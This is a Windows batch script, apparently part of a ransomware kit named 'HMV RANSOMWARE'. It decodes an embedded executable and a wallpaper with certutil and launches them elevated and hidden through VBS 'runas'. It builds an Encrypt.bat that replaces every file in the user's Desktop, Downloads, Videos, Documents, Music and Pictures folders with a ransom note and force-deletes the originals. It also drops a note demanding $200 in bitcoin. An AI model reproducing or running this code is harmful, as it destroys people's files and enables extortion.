echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADNXSDSZtT//zKi3y2ZKwAA>>GDI.txt
echo /////wEAAAABAAAAAgAAAAAACAAAAAAAAAAAAgAAAAABAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAQAAAoEQAA4CcAAEARAABeEQAA+CcAAGARAAAWEgAA>>GDI.txt
echo /CcAABgSAAAoEgAABCgAACgSAABBEgAABCgAAEQSAADAEwAADCgAAMATAADSEwAA>>GDI.txt
echo BCgAANQTAAAIFAAA/CcAAAgUAADaFAAATCgAANwUAABNFQAAVCgAAFAVAACJFQAA>>GDI.txt
echo BCgAAIwVAADVFQAA/CcAANgVAABjFgAA/CcAAGQWAAD8FgAAYCgAAPwWAAAgFwAA>>GDI.txt
echo /CcAACAXAABJFwAA/CcAAEwXAACGFwAA/CcAAIgXAACfFwAABCgAAKAXAABMGAAA>>GDI.txt
echo iCgAAIgYAACjGAAABCgAAMgYAAATGgAAlCgAABwaAABtGgAABCgAAIAaAADbGgAA>>GDI.txt
echo pCgAANwaAAAYGwAApCgAABgbAABUGwAApCgAAFQbAAAAHQAAsCgAANAdAADSHQAA>>GDI.txt
echo wCgAAPAdAAD2HQAAyCgAAPYdAAAUHgAARCgAABQeAAAsHgAAgCgAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAABABgAAAAYAACAAAAAAAAAAAAAAAAAAAABAAEAAAAwAACA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAABAAkEAABIAAAAYGAAAH0BAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnIHN0YW5kYWxvbmU9>>GDI.txt
echo J3llcyc/Pg0KPGFzc2VtYmx5IHhtbG5zPSd1cm46c2NoZW1hcy1taWNyb3NvZnQt>>GDI.txt
echo Y29tOmFzbS52MScgbWFuaWZlc3RWZXJzaW9uPScxLjAnPg0KICA8dHJ1c3RJbmZv>>GDI.txt
echo IHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MyI+DQogICAg>>GDI.txt
echo PHNlY3VyaXR5Pg0KICAgICAgPHJlcXVlc3RlZFByaXZpbGVnZXM+DQogICAgICAg>>GDI.txt
echo IDxyZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCBsZXZlbD0nYXNJbnZva2VyJyB1aUFj>>GDI.txt
echo Y2Vzcz0nZmFsc2UnIC8+DQogICAgICA8L3JlcXVlc3RlZFByaXZpbGVnZXM+DQog>>GDI.txt
echo ICAgPC9zZWN1cml0eT4NCiAgPC90cnVzdEluZm8+DQo8L2Fzc2VtYmx5Pg0KAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAMAAAANCh2KHgoeih>>GDI.txt
echo 8KEAohCiKKIwomCiaKLYovCi+KKAo5ijoKOoo7CjuKMAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>GDI.txt
echo AAAAAAAAAAAAAAAAAAAAAA==>>GDI.txt
echo -----END CERTIFICATE----->>GDI.txt

echo Set objShell = CreateObject("Shell.Application") >GDI.vbs
echo objShell.ShellExecute "%appdata%\HMV\Programs\GDI.exe", "/c lodctr.exe /r", "", "runas", 0 >>GDI.vbs

certutil -decode GDI.txt GDI.exe
start GDI.vbs


:BG
echo -----BEGIN CERTIFICATE----->BG.txt
echo iVBORw0KGgoAAAANSUhEUgAABQAAAALQCAMAAAD4oy1kAAAAAXNSR0IArs4c6QAA>>BG.txt
echo AARnQU1BAACxjwv8YQUAAADtUExURb+/v7y9vpWgs6yxubm7va6yupyltaSrt5ei>>BG.txt
echo s154pI2asaatuLC0umyCqE9sn3uNrJqktWuBp6iuuFl0orK2u1p1oy9VlzFXl4+c>>BG.txt
echo sZOeslNvoUhonnaJqoGRrWN8pThcmVx2ozRZmIiWsIqYsFZyoUtqnpGdspehtEpp>>BG.txt
echo nmZ9pp2mtbq7vT9hm1VxoXOHqqCptml/p2F6pW6EqH2OrERknUZmnYyZsLS3vGV9>>BG.txt
echo paasuKqwuaCotoKSroSTrjxfmoCRrUVlnW+EqG2DqGh/pnSIqp6ntnKGqV13pKKq>>BG.txt
echo t36PrXqMq3GFqVJvoHiLqwAAAGuQQbYAAABPdFJOU///////////////////////>>BG.txt
echo ////////////////////////////////////////////////////////////////>>BG.txt
echo /////////////////wA9VrCzAAAACXBIWXMAAA7DAAAOwwHHb6hkAAASU0lEQVR4>>BG.txt
echo Xu3czW7jyBWAUe/GGEheCLAIB57uhQw0hHqHRBu9/yvlVhVJ/Vj2ZIyEcuae00iL>>BG.txt
echo pPgnDVj5KNn98FD88ccff9L+AQAAAAD+vnwGCACQjQIEAMhGAQIAZKMAAQCyUYAA>>BG.txt
echo ANkoQACAbBQgAEA2ChAAIBsFCACQjQIEAMhGAQIAZKMAAQCyUYAAANkoQPiqcvwV>>BG.txt
echo NvNUaQ9lvqRWMbfq68Sy9uRxerZvETan9R/K8+/TVDxdN6qTfa3Y3frw9FoeVuP6>>BG.txt
echo x5hd93U+Oe501L6X9vTlUZp+EvNsOM57624d4mqVpmyez17QmdX69vLRx/v/9E3p>>BG.txt
echo pzwuBBZUfn/ebnermCi/DtvDrrQFr+OzceVuh93muI916hVajq/b51/Tpdq3ffn1>>BG.txt
echo st/u52VleJ4m4+mhLS+rl2H7unkouyEGgs3zoa1SVv841AF3ONSVPjluO7OXUjYv>>BG.txt
echo T4d6qvH05VHOTmKa3cWmbb9n3h2ivfBrZbUftjcGunI89DP90If7//RNGU+5D+xf>>BG.txt
echo oQDh6zbDa7+Cyma7q1Obswt9FddoXGDl52EcElZvMTFfcG3bWLCatyi7uL6n5zfD>>BG.txt
echo 8FynY5Xdc2y1quNfzD73Ia/vtJRD3/jWcWPNtsoQc/H4ehxP9fIoFyfRZ+s2p1Um>>BG.txt
echo 7w5xvUJVHn5/v2VoZzNOf+CD/X/6prRF438CYFl1cBmnjsOuPqze1sPYI2W3b8+W>>BG.txt
echo 13FJ2c2FE6Zt41LuQ1tM7l+38+3e6u2PaSau9di4t89DOdTweZ7meh/dOu7DeluX>>BG.txt
echo lFVfo0yjy8VRLk9ifj0xcT2o3DzEezFe3R4ZX/9kAPxo/5+9KWE+5a9RgPBlpeZH>>BG.txt
echo d4wCDKunY82vqjzv+rPTkvLc7oTrZJ2bt12NE3FbW4b5fnjzNGdYu9bXU0fudjXY>>BG.txt
echo puyJ4bUuv33cWDPW77tZ7fv2ZfVUfvbB491JnL2e1+sPAW8e4obdcPOzwXr+49QH>>BG.txt
echo bu//8zfl4pSBRZ3yYy7AGF36lR610ke2uAdu12osGIew5ry2xondax3O2nQsfYpr>>BG.txt
echo u2/YCnB6ppT2eeDYSnHgOvLePm77uDDSazjGw5SfV0e5OInT63kfRrcOEVP1y4o6>>BG.txt
echo VWdK/bZlLNX6zMWHhFGAZdO/MSqb1SaeGx9GN/cf05+9KW3RfMpfoQDh624UYIkb>>BG.txt
echo uXZRrV+nZ3ukPcSlHH/PF9z0bNw09ru6WohjtcVM7GnaVbvWj9tp/IyLNu6Ap/30>>BG.txt
echo O9xbxy1vdTyJW+Y2OyVd2R9PRzk/iXr+fTZisS28dOMQ5fnwa3McA62sD7vXw/qP>>BG.txt
echo OLVI1H8cfo+Km/dTogBXw/5fb4dNjJFP28M+HtfDcPbV8M237k/elDCvCSzrLD8e>>BG.txt
echo WwE+bN7icq3XffTXcXx2vIDLc4TYybRtPE7N9BZDW++bEHtqX3XEE60A48I/vIzP>>BG.txt
echo ta8+2kb1OHX65nFrJ5YYzQ5vdfG4fowhp6NcnUQp/4zZcnxrT166OsTPut1u2MVo>>BG.txt
echo 176eiYX151/q17f1oc6UzaHtvFsP2zib9llj+1gyViqv7Yuj7tb+Y/rTNyWc/Sf4>>BG.txt
echo itjdOAX8VZvhad+99QGwJkoLr4fjc1zn41Xc7oHHO+D5gtsM65fjy8t6W6OoLtjV>>BG.txt
echo LzjHWmx7inXaiNCv9Rg7hiHCqU5GdPW1Yrodru783XHbwBvdWT9+W/0Yt2g7m49y>>BG.txt
echo fhKxr81wWK/3hx/tuStnh3gbu2vd/i5tnNtt26mt2md06z4Tt8P9MCHWrdP92+B+>>BG.txt
echo /PYSZzf2H/7kTamvYFwTWFbNj1X9JGuzepm+BY4hp05G3cxx0j7EKsfLCzWe3b+8>>BG.txt
echo DMP8ZUN5rpsdI6raXN1TjAj1m9xdL7KaT9vhUDtqTqK6Wd15HRmujxslFRuuN7UE>>BG.txt
echo Tx8BTkfpc5cnUbfcbFbrOPQ7Nw5RVvVH8WI4rtPPfaNIwBpp/YdVVuOLqfp30vVe>>BG.txt
echo O15ApF6dHM+pufkSPn5TFCDcXc2Peg2Vh9OXIHHZ72NJ/cx/ujZbio0fws0XXHu2>>BG.txt
echo 10xTDi+/fr3sprEt7vbimfbzeeMAWLc9Pg0xmk3fFlT1FjgCL9Z+d9y4a663vnUc>>BG.txt
echo eliPQ1EcJZLvdJTLk2izcdfc5y5dvLTpe5aYO7YOnL+1qMecZuaFoS6vj7EsNqod>>BG.txt
echo 2L8Vn93Yfzvdj96U81cALO8sP/pngD1R3uJar5fqnDHtU7gWRSft2THx2vzx7aV6>>BG.txt
echo OvtEMEa8+k3Cbr4ljZ3vhtjzfh4Ae+bVw70/bmz8WG99Y5UYVNqS66NcnkTfsqxu>>BG.txt
echo 3QLPLy3uUKdDlGjbw+vm8Hr2WuuPwZRheGoO9U3pxh+D6UNbrLUrm/FHmbtb+//k>>BG.txt
echo TTll8Xjgr4lDjlPAX3XKj/qbIKHex9UbuVY3cwDVFDuOlTVfcH3b1TDl3boPFnXj>>BG.txt
echo +liDKB5iSNj8Ma1StW+Ap5wK/SBt7XfHjYn61XN5O4x760eJqekoVyfRZ6ddX2i3>>BG.txt
echo qA+7aNl6iL7isf1eRhuC5neifu43z5ztavo5wPF8o+nGFzy6tf8P35TneFP6d8+n>>BG.txt
echo AwPLOsuPs88AI3Le6tV89mzcIF9e7vO20VD9ibHRYuN2b9earjoOh4ids08QY/Ab>>BG.txt
echo b7ir+gFf3aoet1wdt6bfvrZdFNO4+XSUWHV8PD+JecvY4Rims9NL64eKFcffw6tf>>BG.txt
echo gpy2XG9rcl41ZKxWPwetU+NnBa/DZhwRRzf2X3fdN7p6U8pxexj/X+F04C+JQ41T>>BG.txt
echo wF91yo/pFrhmTARKDDinjGnZUz+pq+YLbnx2+tWGuPGrs73w4jHGgbagvG63ca2X>>BG.txt
echo 9jVtVX8lZPoV4Lp523E/7lsb6GK4mI677jt/HPrZxVSMpXWq3S7HxNVJnM741m+C>>BG.txt
echo xJL20uKxrTgep/3ISnnrRdZ2XL/Nvdq8rLePbaJ+IxMPMYRd/Tbx+/1//KbUF1YH>>BG.txt
echo wBilT6cMLOosPx639Yf0asbEFbobWpadno1hYbyUZ/1n7sKuXcplPf2QX9zuxd9z>>BG.txt
echo AcbgtK09NX2G1n7opH6GVufq2tNxY2R7d9zH+oFhLPnZ8ytG06ujTCfx0k9i2jLG>>BG.txt
echo 0M1DeTz/VY52iIuXNq7dz6j+GEybaUPpeHrn33z3H5mpt+N1N3UEruufvN9/PHz4>>BG.txt
echo pjzUN6WGa6w5rfMVChC+7nH4MV5A4689PLZSKT9baMWz/cn5Ah7/V5UYnPpE+xHC>>BG.txt
echo GHHGZzb9H0U59uapC7ZP8ffj0H9Ur6fk+Jsb8dA/WhyPe6gDRNxl9j3PjfYwFdlq>>BG.txt
echo +K09Tke5Oon59UQy1h+6mU8hxKoxV04vLWZ+tmg7DK+rqfpiP221GN7iqeP0yWNY>>BG.txt
echo H9oRxgCMiatIjLO+3v+fvin7eP60CFhQrZ3ttl7WMRUTw2NdUK/UFloxMMRcvejb>>BG.txt
echo CpdXad02tHrbtN0M/d8FrCNI3LDWHY7/Jl952NdxdPO2ezrs99OIW/+FvR/77aH+>>BG.txt
echo dkk7kXbcKKYIstjZdNwfv7XH/hN35Uc807afj1K1gjrGxGv8L86kbR/D0267nYbL>>BG.txt
echo foh6QtNLqy88bvi3T0+HzVtL1LI+rNfDj9gq5uLG/VDPdRyc4u/XTQy2+/qrcH3J>>BG.txt
echo 7mXad9Xewev97//kTSnl6Wk9XOznr4oDjlPAX1Iv7n75TFOXC84urrMVurog5tp8>>BG.txt
echo W7H/mbxbv4qZ9tXEtLBsYjBpa8Vf48JpdnI22ZwfZNxuXDTuavy7LVmd4up0iDY1>>BG.txt
echo 76b0UxifitOrQ16dKzEzbx3a0lUsm+b3F/9ozO3914fTWtM6Z0vi+OMkwGdOA8d/>>BG.txt
echo pvzWb68/MY1UozpEzS6f6vqS8q+348VvgXzdxRG/4NZJAn8bX7/Ay/q/Nzhc7mld>>BG.txt
echo 72Rj0fnS/96xAK59YYT5Dzb54rgV5XV7y4XHQQUIf2/f4wq/eRYXC41EwP/K/8f4>>BG.txt
echo svRZKkD4m/sWl/jNk7hcaCgC/jeMLjcpQPi7+xbX+K2TMPgA3I0CBBagAAG+FQUI>>BG.txt
echo LOHGSGPwAbgbBQgsQQECfCcKEFjE+6HG4ANwNwoQWIQCBPhGFCCwjHdjjcEH4G4U>>BG.txt
echo ILAMBQjwfShAYCHXg43BB+BuFCCwEAUI8G0oQGApV6ONwQfgbhQgsBQFCPBdKEBg>>BG.txt
echo MZfDjcEH4G4UILAYBQjwTShAYDkX443BB+BuFCCwHAUI8D0oQGBB5wOOwQfgbhQg>>BG.txt
echo sCAFCPAtKEBgSWcjjsEH4G4UILAkBQjwHShAYFGnIcfgA3A3ChBYlAIE+AYUILCs>>BG.txt
echo ecwx+ADcjQIElqUAAe5PAQILmwYdgw/A3ShAYGEKEODuFCCwtHHUMfgA3I0CBJam>>BG.txt
echo AAHuTQECi+vDjsEH4G4UILA4BQhwZwoQWF4bdww+AHejAIHlKUCA+1KAwB3Ugcfg>>BG.txt
echo A3A3ChC4AwUIcFcKELgHIw/APSlAAIBsFCAAQDYKEAAgGwUIAJCNAgQAyEYBAgBk>>BG.txt
echo owABALJRgAAA2ShAAIBsFCAAQDYKEAAgGwUIAJCNAgQAyEYBAgBkowABALJRgAAA>>BG.txt
echo 2ShAAIBsFCAAQDYKEAAgGwUIAJCNAgQAyEYBAgBkowABALJRgAAA2ShAAIBsFCAA>>BG.txt
echo QDYKEAAgGwUIAJCNAgQAyEYBAgBkowABALJRgAAA2ShAAIBsFCAAQDYKEAAgGwUI>>BG.txt
echo AJCNAgQAyEYBAgBkowABALJRgAAA2ShAAIBsFCAAQDYKEAAgGwUIAJCNAgQAyEYB>>BG.txt
echo AgBkowABALJRgAAA2ShAAIBsFCAAQDYKEAAgGwUIAJCNAgQAyEYBAgBkowABALJR>>BG.txt
echo gAAA2ShAAIBsFCAAQDYKEAAgGwUIAJCNAgQAyEYBAgBkowABALJRgAAA2ShAAIBs>>BG.txt
echo FCAAQDYKEAAgGwUIAJCNAgQAyEYBAgBkowABALJRgAAA2ShAAIBsFCAAQDYKEAAg>>BG.txt
echo GwUIAJCNAgQAyEYBAgBkowABALJRgAAA2ShAAIBsFCAAQDYKEAAgGwUIAJCNAgQA>>BG.txt
echo yEYBAgBkowABALJRgAAA2ShAAIBsFCAAQDYKEAAgGwUIAJCNAgQAyEYBAgBkowAB>>BG.txt
echo ALJRgAAA2ShAAIBsFCAAQDYKEAAgGwUIAJCNAgQAyEYBAgBkowABALJRgAAA2ShA>>BG.txt
echo AIBsFCAAQDYKEAAgGwUIAJCNAgQAyEYBAgBkowABALJRgAAA2ShAAIBsFCAAQDYK>>BG.txt
echo EAAgGwUIAJCNAgQAyEYBAgBkowABALJRgAAA2ShAAIBsFCAAQDYKEAAgGwUIAJCN>>BG.txt
echo AgQAyEYBAgBkowABALJRgAAA2ShAAIBsFCAAQDYKEAAgGwUIAJCNAgQAyEYBAgBk>>BG.txt
echo owABALJRgAAA2ShAAIBsFCAAQDYKEAAgGwUIAJCNAgQAyEYBAgBkowABALJRgAAA>>BG.txt
echo 2ShAAIBsFCAAQDYKEAAgGwUIAJCNAgQAyEYBAgBkowABALJRgAAA2ShAAIBsFCAA>>BG.txt
echo QDYKEAAgGwUIAJCNAgQAyEYBAgBkowABALJRgAAA2ShAAIBsFCAAQDYKEAAgGwUI>>BG.txt
echo AJCNAgQAyEYBAgBkowABALJRgAAA2ShAAIBsFCAAQDYKEAAgGwUIAJCNAgQAyEYB>>BG.txt
echo AgBkowABALJRgAAA2ShAAIBsFCAAQDYKEAAgGwUIAJCNAgQAyEYBAgBkowABALJR>>BG.txt
echo gAAA2ShAAIBsFCAAQDYKEAAgGwUIAJCNAgQAyEYBAgBkowABALJRgAAA2ShAAIBs>>BG.txt
echo FCAAQDYKEAAgGwUIAJCNAgQAyEYBAgBkowABALJRgAAA2ShAAIBsFCAAQDYKEAAg>>BG.txt
echo GwUIAJCNAgQAyEYBAgBkowABALJRgAAA2ShAAIBsFCAAQDYKEAAgGwUIAJCNAgQA>>BG.txt
echo yEYBAgBkowABALJRgAAA2ShAAIBsFCAAQDYKEAAgGwUIAJCNAgQAyEYBAgBkowAB>>BG.txt
echo ALJRgAAA2ShAAIBsFCAAQDYKEAAgGwUIAJCNAgQAyEYBAgBkowABALJRgAAA2ShA>>BG.txt
echo AIBsFCAAQDYKEAAgGwUIAJCNAgQAyEYBAgBkowABALJRgAAA2ShAAIBsFCAAQDYK>>BG.txt
echo EAAgGwUIAJCNAgQAyEYBAgBkowABALJRgAAA2ShAAIBsFCAAQDYKEAAgGwUIAJCN>>BG.txt
echo AgQAyEYBAgBkowABALJRgAAA2ShAAIBsFCAAQDYKEAAgGwUIAJCNAgQAyEYBAgBk>>BG.txt
echo owABALJRgAAA2ShAAIBsFCAAQDYKEAAgGwUIAJCNAgQAyEYBAgBkowABALJRgAAA>>BG.txt
echo 2ShAAIBsFCAAQDYKEAAgGwUIAJCNAgQAyEYBAgBkowABALJRgAAA2ShAAIBsFCAA>>BG.txt
echo QDYKEAAgGwUIAJCNAgQAyEYBAgBkowABALJRgAAA2ShAAIBsFCAAQDYKEAAgGwUI>>BG.txt
echo AJCNAgQAyEYBAgBkowABALJRgAAA2ShAIKuHh38DxyHqRUl1uhoAAAAASUVORK5C>>BG.txt
echo YII=>>BG.txt
echo -----END CERTIFICATE----->>BG.txt
certutil -decode BG.txt BG.png>nul
del BG.txt>nul
reg add "hkcu\control panel\desktop" /v wallpaper /t REG_SZ /d "%appdata%\HMV\Programs\BG.png" /f>nul
reg add "hkcu\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 6 /f>nul

:Readme
echo ----What happened to my files?---->>Readme.txt
echo Your personal files are all encrypted by HMV RANSOMWARE.>>Readme.txt
echo You cannot access your files until you get your PERSONAL KEY.>>Readme.txt
echo.>>Readme.txt
echo ----How Can I get my key?---->>Readme.txt
echo Pay 200 dollars worth bitcoin by the link, and you'll get your personal key.>>Readme.txt
echo : %random%%random%@gmail.com>>Readme.txt
echo.>>Readme.txt
echo Good Luck!>>Readme.txt

:FileBackup
echo xcopy %userprofile%\Desktop %appdata%\HMV\Backup\Desktop /e /h /y >>Encrypt.bat
echo xcopy %userprofile%\Downloads %appdata%\HMV\Backup\Downloads /e /h /y >>Encrypt.bat
echo xcopy %userprofile%\Videos %appdata%\HMV\Backup\Videos /e /h /y >>Encrypt.bat
echo xcopy %userprofile%\Documents %appdata%\HMV\Backup\Documents /e /h /y >>Encrypt.bat
echo xcopy %userprofile%\Music %appdata%\HMV\Backup\Music /e /h /y >>Encrypt.bat
echo xcopy %userprofile%\Pictures %appdata%\HMV\Backup\Pictures /e /h /y >>Encrypt.bat

:Modulation
echo cd %userprofile%\desktop>>Encrypt.bat
echo For /F "tokens=*" %%%%A in ('dir /b /s /a-h /a-d') do (>>Encrypt.bat
echo echo ----What happened to my files?----^>"%%%%~A.HMV">>Encrypt.bat
echo echo Your personal files are all encrypted by HMV RANSOMWARE.^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo You cannot access your files until you get your PERSONAL KEY.^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo.^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo ----How Can I get my key?----^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo Pay 200 dollars worth bitcoin by the link, and you'll get your personal key.^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo : %random%%random%@gmail.com^>^>"%%%%~A.HMV">>Encrypt.bat
echo Del /f /q "%%%%~A">>Encrypt.bat
echo )>nul>>Encrypt.bat
echo cd %userprofile%\downloads>>Encrypt.bat
echo For /F "tokens=*" %%%%A in ('dir /b /s /a-h /a-d') do (>>Encrypt.bat
echo echo ----What happened to my files?----^>"%%%%~A.HMV">>Encrypt.bat
echo echo Your personal files are all encrypted by HMV RANSOMWARE.^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo You cannot access your files until you get your PERSONAL KEY.^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo.^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo ----How Can I get my key?----^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo Pay 200 dollars worth bitcoin by the link, and you'll get your personal key.^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo : %random%%random%@gmail.com^>^>"%%%%~A.HMV">>Encrypt.bat
echo Del /f /q "%%%%~A">>Encrypt.bat
echo )>nul>>Encrypt.bat
echo cd %userprofile%\Videos>>Encrypt.bat
echo For /F "tokens=*" %%%%A in ('dir /b /s /a-h /a-d') do (>>Encrypt.bat
echo echo ----What happened to my files?----^>"%%%%~A.HMV">>Encrypt.bat
echo echo Your personal files are all encrypted by HMV RANSOMWARE.^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo You cannot access your files until you get your PERSONAL KEY.^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo.^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo ----How Can I get my key?----^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo Pay 200 dollars worth bitcoin by the link, and you'll get your personal key.^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo : %random%%random%@gmail.com^>^>"%%%%~A.HMV">>Encrypt.bat
echo Del /f /q "%%%%~A">>Encrypt.bat
echo )>nul>>Encrypt.bat
echo cd %userprofile%\Documents>>Encrypt.bat
echo For /F "tokens=*" %%%%A in ('dir /b /s /a-h /a-d') do (>>Encrypt.bat
echo echo ----What happened to my files?----^>"%%%%~A.HMV">>Encrypt.bat
echo echo Your personal files are all encrypted by HMV RANSOMWARE.^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo You cannot access your files until you get your PERSONAL KEY.^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo.^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo ----How Can I get my key?----^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo Pay 200 dollars worth bitcoin by the link, and you'll get your personal key.^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo : %random%%random%@gmail.com^>^>"%%%%~A.HMV">>Encrypt.bat
echo Del /f /q "%%%%~A">>Encrypt.bat
echo )>nul>>Encrypt.bat
echo cd %userprofile%\Music>>Encrypt.bat
echo For /F "tokens=*" %%%%A in ('dir /b /s /a-h /a-d') do (>>Encrypt.bat
echo echo ----What happened to my files?----^>"%%%%~A.HMV">>Encrypt.bat
echo echo Your personal files are all encrypted by HMV RANSOMWARE.^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo You cannot access your files until you get your PERSONAL KEY.^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo.^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo ----How Can I get my key?----^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo Pay 200 dollars worth bitcoin by the link, and you'll get your personal key.^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo : %random%%random%@gmail.com^>^>"%%%%~A.HMV">>Encrypt.bat
echo Del /f /q "%%%%~A">>Encrypt.bat
echo )>nul>>Encrypt.bat
echo cd %userprofile%\Pictures>>Encrypt.bat
echo For /F "tokens=*" %%%%A in ('dir /b /s /a-h /a-d') do (>>Encrypt.bat
echo echo ----What happened to my files?----^>"%%%%~A.HMV">>Encrypt.bat
echo echo Your personal files are all encrypted by HMV RANSOMWARE.^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo You cannot access your files until you get your PERSONAL KEY.^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo.^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo ----How Can I get my key?----^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo Pay 200 dollars worth bitcoin by the link, and you'll get your personal key.^>^>"%%%%~A.HMV">>Encrypt.bat
echo echo : %random%%random%@gmail.com^>^>"%%%%~A.HMV">>Encrypt.bat
echo Del /f /q "%%%%~A">>Encrypt.bat
echo )>nul>>Encrypt.bat
echo move %appdata%\HMV\Programs\Readme.txt %userprofile%\desktop\Readme.txt>>Encrypt.bat
cd %appdata%\HMV\Programs

:VBS_E
echo Set objShell = CreateObject("Shell.Application") >Encrypt.vbs
echo objShell.ShellExecute "%appdata%\HMV\Programs\Encrypt.bat", "/c lodctr.exe /r", "", "runas", 0 >>Encrypt.vbs

:Decryption
echo xcopy %appdata%\HMV\Backup\Desktop %userprofile%\Desktop /e /h /y >Decrypt.bat
echo xcopy %appdata%\HMV\Backup\Downloads %userprofile%\Downloads /e /h /y>>Decrypt.bat
echo xcopy %appdata%\HMV\Backup\Videos %userprofile%\Videos /e /h /y>>Decrypt.bat
echo xcopy %appdata%\HMV\Backup\Documents %userprofile%\Documents /e /h /y>>Decrypt.bat
echo xcopy %appdata%\HMV\Backup\Music %userprofile%\Music /e /h /y>>Decrypt.bat
echo xcopy %appdata%\HMV\Backup\Pictures %userprofile%\Pictures /e /h /y>>Decrypt.bat
